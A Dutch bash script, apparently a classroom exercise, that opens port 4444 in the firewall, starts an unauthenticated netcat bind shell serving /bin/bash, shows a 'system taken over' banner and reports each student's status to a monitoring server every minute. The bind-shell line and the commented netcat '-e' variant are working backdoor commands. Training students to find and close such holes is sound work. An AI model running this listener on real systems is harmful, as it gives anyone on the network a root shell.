#!/bin/bash

### CONFIG ###
SERVER_IP="148.100.79.193"  # <- Vervang dit door het IP van je Flask-server
LISTENER_PORT=4444
CALLBACK_PORT=5000

# Check op parameter (voornaam)
if [ -z "$1" ]; then
  echo "Gebruik: sudo bash $0 <voornaam>"
  exit 1
fi

STUDENT_NAAM="$1"

echo "[*] Setup gestart voor $STUDENT_NAAM..."

# Poort openzetten met iptables
iptables -C INPUT -p tcp --dport $LISTENER_PORT -j ACCEPT 2>/dev/null || \
iptables -I INPUT -p tcp --dport $LISTENER_PORT -j ACCEPT

# Start listener
mkfifo /tmp/f
(cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp 4444 > /tmp/f) &
# nohup nc -lvnp $LISTENER_PORT -e /bin/bash &>/dev/null &

# Externe IP achterhalen
EXTERNAL_IP=$(curl -s ifconfig.me)

# Eerste registratie naar monitoringserver
curl -s -X POST http://$SERVER_IP:$CALLBACK_PORT/update \
  -d "student=$STUDENT_NAAM&status=vulnerable" &>/dev/null

# Toon ASCII-banner
echo -e "\n\033[1;31m
██╗░░██╗███████╗██╗░░░██╗███████╗██╗░░██╗██████╗░
██║░░██║██╔════╝╚██╗░██╔╝██╔════╝██║░░██║██╔══██╗
███████║█████╗░░░╚████╔╝░█████╗░░███████║██████╔╝
██╔══██║██╔══╝░░░░╚██╔╝░░██╔══╝░░██╔══██║██╔═══╝░
██║░░██║███████╗░░░██║░░░███████╗██║░░██║██║░░░░░
╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░

\033[0mJe systeem is overgenomen. Poort $LISTENER_PORT staat open.
Herstel dit voordat de 15 minuten om zijn!
" | tee /tmp/hacked_banner.txt

# Start background status monitor
status_reporter() {
  while true; do
    if pgrep -f "nc -lvnp $LISTENER_PORT" > /dev/null; then
      STATUS="vulnerable"
    else
      STATUS="secure"
    fi

    curl -s -X POST http://$SERVER_IP:$CALLBACK_PORT/update \
      -d "student=$STUDENT_NAAM&status=$STATUS" &>/dev/null

    sleep 60
  done
}

status_reporter &

echo "[✓] Setup compleet. Volg live op: http://$SERVER_IP:$CALLBACK_PORT"
